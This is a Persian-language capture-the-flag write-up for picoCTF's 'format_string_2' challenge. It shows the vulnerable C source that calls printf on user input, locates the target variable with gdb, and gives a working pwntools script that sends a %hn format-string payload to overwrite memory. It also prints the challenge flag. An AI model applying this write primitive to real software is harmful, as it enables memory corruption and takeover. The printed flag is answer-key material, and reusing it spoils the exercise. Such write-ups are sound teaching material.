---
tags:
  - PWN
---
# format_string_2

درود و صد درود !
 با یه چالش جذاب اومدیم از 
 [picoCTF](https://play.picoctf.org/practice/challenge/448?category=6&difficulty=2&page=1) 


این از سورس فایل.
``` cpp
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

مشخصه که ما باید مقدار $sus$ رو به مقدار $0x67616c66$ تبدیل کنیم.
با استفاده از ابزار checksec می‌توان متوجه شد که PIE غیرفعال است و در نتیجه آدرس ها در برنامه ثابت هستند.

برای تغییر مقدار $sus$ می‌تونیم از استرینگ فرمت ها استفاده کنیم . 
فرمت استرینگ $ %n $ را استفاده می‌کنیم که کافی است مقدار $0x67616c66$ کاراکتر نوشته باشیم و سپس با استفاده از $%n$ آن ها را در $sus$ بریزیم. با استفاده از gdb می‌توان پیدا کرد که آدرس متغییر $sus$ برابر است با $404060$ و همچنین در خانه $18$ استک هم وجود دارد.

چون مقدار $0x67616c66$ زیاد است به جای نوشتن این حجم کاراکتر و سپس استفاده کردن $%n$، آن را به دو بخش تقسیم می‌کنیم سپس با $%hn$ آن را در حافظه می‌نویسیم.

 کد زیر مرحله به مرحله کارهای ذکر شده را با یک اسکریپت نشان می‌دهد:
```py
from pwn import *

chall = remote("rhea.picoctf.net", 56778)

sus_1 = bytes.fromhex("404062")[::-1] + b'\x00' * 5  # (8 bytes)
sus_2 = bytes.fromhex("404060")[::-1] + b'\x00' * 5  # (8 bytes)

val_1 = int("6761", 16)
val_2 = int("6c66", 16)

payload = b'%' + str(val_1).encode() + b'c%18$hn' + b'%' + str(val_2 - val_1).encode() + b'c%19$hn'
payload += ((8 - len(payload) % 8) % 8) * b'\x00'  # (Fit the frame)
payload += sus_1 + sus_2

chall.sendlineafter(b'?\n', payload)
chall.interactive()

```

فلگ پیدا شد !!!

??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}`</div>

--- 

!!! نویسنده
    [sw33tw3as3l](https://github.com/sw33tw3as3l)